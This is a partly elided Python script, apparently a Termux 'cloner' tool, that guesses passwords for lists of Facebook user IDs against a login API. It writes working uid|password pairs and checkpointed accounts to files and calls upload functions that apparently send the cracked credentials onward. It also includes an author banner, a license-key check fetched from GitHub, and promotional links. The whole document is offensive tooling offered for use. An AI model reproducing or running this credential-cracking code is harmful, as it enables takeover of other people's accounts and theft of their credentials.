...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastebin.com/raw/ThnYcrMx"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/C4LL.M3.D3V1L")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ Facebook🤲https://www.facebook.com/C4LL.M3.D3V1L")
	subprocess.check_output(["am", "start", "https://www.facebook.com/C4LL.M3.D3V1L"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/C4LLM3D3V1L/SECDET/blob/main/Approve.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[41m\033[1;37m[ADNAN]   [NAHID]   [AFRIDY]   [SecDet]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : NAHID AFRIDY \033[1;32m[NaDu]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mhttp://githib.com/NAHID-AFRIDY\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  +8801923092304          │
\033[1;36m│ [✓] POWER  : \x1b[1;32mSeDet\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
""")
		print("%s [%s•%s] %sTOOL NAME : %sNaDu❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Nahid): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SecDet] : %s/%s -> \033[0;92m [ SecDet-OK:%s ]- \033[0;91m[SecDet-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Nahid-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Nahid-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Nahid-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
